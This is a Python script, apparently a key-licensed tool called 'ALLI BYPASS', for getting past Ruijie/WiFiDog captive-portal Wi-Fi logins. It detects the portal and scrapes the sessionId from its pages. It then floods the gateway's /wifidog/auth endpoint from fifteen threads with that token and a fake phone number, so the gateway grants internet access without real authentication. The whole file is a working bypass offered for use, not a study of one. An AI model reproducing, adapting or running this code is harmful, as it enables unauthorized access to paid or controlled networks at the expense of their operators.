import requests
import re
import urllib3
import time
import threading
import logging
import random
import datetime
import os
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# 🌐 ONLINE CONFIG (GitHub Link)
# ===============================
KEY_URL = "https://raw.githubusercontent.com/Zyan091/my-database/main/key.txt"

# ===============================
# COLOR SYSTEM
# ===============================
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
RESET = "\033[0m"

stop_event = threading.Event()
USER_DATA = {"key": "", "id": "", "exp": ""}
PING_THREADS = 15

def clear():
    os.system('clear')

def banner():
    clear()
    print(f"{CYAN}="*48)
    print(f"{MAGENTA}  ▄▄▄· ▄▄▌  ▄▄▌  ▪  ▄▄▄▄·  ▄▄▄· .▄▄ · .▄▄ · ")
    print(f"{MAGENTA} ▐█ ▀█ ██•  ██•  ██ ▐█ ▀█▪▐█ ▀█ ▐█ ▀. ▐█ ▀. ")
    print(f"{WHITE} ▄█▀▀█ ██▪  ██▪  ▐█·▐█▀▀█▄▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄")
    print(f"{WHITE} ▐█ ▪▐▌▐█▌▐▌▐█▌▐▌▐█▌▐█▄▪▐█▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█")
    print(f"{CYAN}  ▀  ▀ .▀▀▀ .▀▀▀ ▀▀▀··▀▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀▀ ")
    print(f"{CYAN}="*48)
    print(f"{YELLOW} [+] OWNER   : ALLI BYPASS")
    print(f"{YELLOW} [+] USER ID : {USER_DATA['id']}")
    print(f"{RED} [+] EXPIRY  : {USER_DATA['exp']}")
    print(f"{GREEN} [+] STATUS  : ONLINE PREMIUM VERIFIED")
    print(f"{CYAN}="*48 + f"{RESET}")

def fetch_online_key():
    try:
        response = requests.get(KEY_URL, timeout=10)
        if response.status_code == 200:
            data = response.text.strip().split('|')
            if len(data) >= 3:
                USER_DATA['key'] = data[0].strip()
                USER_DATA['id'] = data[1].strip()
                USER_DATA['exp'] = data[2].strip()
                return True
    except:
        return False
    return False

def login():
    if not fetch_online_key():
        print(f"{RED}[X] SERVER ERROR: အင်တာနက်စစ်ပါ။{RESET}")
        exit()

    banner()
    print(f"\n{WHITE}[*] Enter GitHub Key To Continue")
    input_key = input(f"{CYAN}[🔑] KEY: {RESET}")
    
    if input_key == USER_DATA['key']:
        today = datetime.datetime.now().strftime("%Y-%m-%d")
        if today > USER_DATA['exp']:
            print(f"\n{RED}[!] KEY EXPIRED!{RESET}")
            exit()
        print(f"\n{GREEN}[✓] LOGIN SUCCESS!{RESET}")
        time.sleep(1)
        return True
    else:
        print(f"\n{RED}[X] INVALID KEY!{RESET}")
        exit()

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=15)
            print(f"{GREEN}[⚡] {RESET}ID: {USER_DATA['id']} | {CYAN}BYPASSING...{RESET}     ", end="\r")
        except: pass
        time.sleep(random.uniform(0.01, 0.05))

def start_process():
    if not login(): return
    banner()

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = requests.get(test_url, allow_redirects=True, timeout=10)

            if r.url == test_url:
                print(f"{YELLOW}[•]{RESET} Monitoring... (Online)                    ", end="\r")
                time.sleep(5)
                continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{GREEN}[!] GATEWAY DETECTED!{RESET}")

            # Ruijie Logic
            r1 = session.get(portal_url, verify=False, timeout=15)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=15)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if sid:
                print(f"{CYAN}[✓] SID CAPTURED. LAUNCHING TURBO...{RESET}")
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

                while True:
                    try:
                        if requests.get("http://www.google.com", timeout=5).status_code == 200:
                            time.sleep(10)
                        else: break
                    except: break
            else:
                time.sleep(5)

        except Exception:
            time.sleep(2)

if __name__ == "__main__":
    try: start_process()
    except KeyboardInterrupt: exit()
